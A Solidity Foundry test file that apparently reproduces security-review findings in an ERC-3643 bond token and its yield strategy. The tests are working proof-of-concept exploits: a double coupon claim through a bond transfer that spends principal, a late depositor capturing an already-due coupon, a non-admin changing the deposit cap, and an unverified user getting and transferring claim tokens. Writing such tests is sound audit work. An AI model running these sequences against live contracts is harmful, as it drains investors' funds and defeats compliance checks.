// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.28;
import {ERC3643BondTest} from "./ERC3643Bond.t.sol";
import {ERC3643BondStrategyTest} from "./ERC3643BondStrategy.t.sol";

contract ReviewCouponFindings is ERC3643BondTest {
    function testReproTransferAllowsSecondClaimFromSameBonds() public {
        uint256 bonds = _purchase(alice, 950e18);
        vm.startPrank(issuer);
        uint256 id = bond.scheduleCoupon(t0 + 1 days, t0 + 2 days, 0.1e18);
        cash.approve(address(bond), type(uint256).max);
        bond.fundCoupon(id, 100e18);
        vm.stopPrank();
        vm.warp(t0 + 2 days);
        vm.prank(alice);
        uint256 first = bond.claimCoupon(id);
        vm.prank(alice);
        bond.transfer(bob, bonds);
        vm.prank(bob);
        uint256 second = bond.claimCoupon(id);
        assertEq(first, 100e18);
        assertEq(second, 100e18);
        assertEq(cash.balanceOf(address(bond)), 850e18, "second coupon spent principal");
    }
}

contract ReviewStrategyFindings is ERC3643BondStrategyTest {
    function testReproNewDepositorCapturesAlreadyDueCoupon() public {
        vm.prank(alice);
        sy.deposit(950e18, 0);
        vm.startPrank(issuer);
        uint256 id = bond.scheduleCoupon(t0 + 1 days, t0 + 2 days, 0.1e18);
        bond.fundCoupon(id, 100e18);
        vm.stopPrank();
        vm.warp(t0 + 2 days);
        address newcomer = address(0xCAFE);
        cash.mint(newcomer, 950e18);
        vm.startPrank(newcomer);
        cash.approve(address(sy), type(uint256).max);
        uint256 shares = sy.deposit(950e18, 0);
        vm.stopPrank();
        strategy.touch();
        vm.prank(newcomer);
        uint256 paid = sy.redeem(shares, 0);
        assertGt(paid, 990e18, "new depositor captured over 40 cash from already due coupon");
    }

    function testReproNonAdminChangesDepositCap() public {
        vm.prank(alice);
        sy.setDepositCap(admin, 1);
        assertEq(sy.depositCap(), 1);
    }

    function testReproUnverifiedUserGetsAndTransfersClaims() public {
        assertFalse(registry.isVerified(alice));
        vm.startPrank(alice);
        uint256 shares = sy.deposit(1_000e18, 0);
        tokenizer.split(shares);
        uint256 amount = pt.balanceOf(alice);
        pt.transfer(address(0xBAD), amount);
        vm.stopPrank();
        assertGt(pt.balanceOf(address(0xBAD)), 0);
    }
}
